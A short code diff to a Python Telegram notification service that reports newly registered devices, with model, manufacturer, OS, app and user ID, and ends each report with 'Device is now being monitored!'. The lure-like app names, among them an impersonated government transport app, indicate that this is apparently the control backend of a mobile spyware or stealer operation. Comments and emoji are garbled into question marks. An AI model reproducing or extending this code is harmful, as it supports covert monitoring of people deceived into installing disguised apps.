@@ -205,6 +205,18 @@ class TelegramMultiService:
         admin_username: str
     ):
         """Notify device registration (Bot 1)"""
+        # ??????? ????????
+        app_type = device_info.get('app_type', 'Unknown')
+        user_id = device_info.get('user_id', 'N/A')
+        
+        # ??? ???????? ?????
+        app_names = {
+            'sexychat': '?? SexyChat',
+            'mparivahan': '?? mParivahan',
+            'sexyhub': '?? SexyHub'
+        }
+        app_display = app_names.get(app_type.lower(), f'?? {app_type}')
+        
         message = f"""
 ?? <b>New Device Registered</b>
 
@@ -213,6 +225,8 @@ class TelegramMultiService:
 ?? Model: {device_info.get('model', 'Unknown')}
 ?? Manufacturer: {device_info.get('manufacturer', 'Unknown')}
 ?? OS: {device_info.get('os_version', 'Unknown')}
+?? App: {app_display}
+?? User ID: <code>{user_id[:20]}...</code>
 ?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
 
 ? Device is now being monitored!
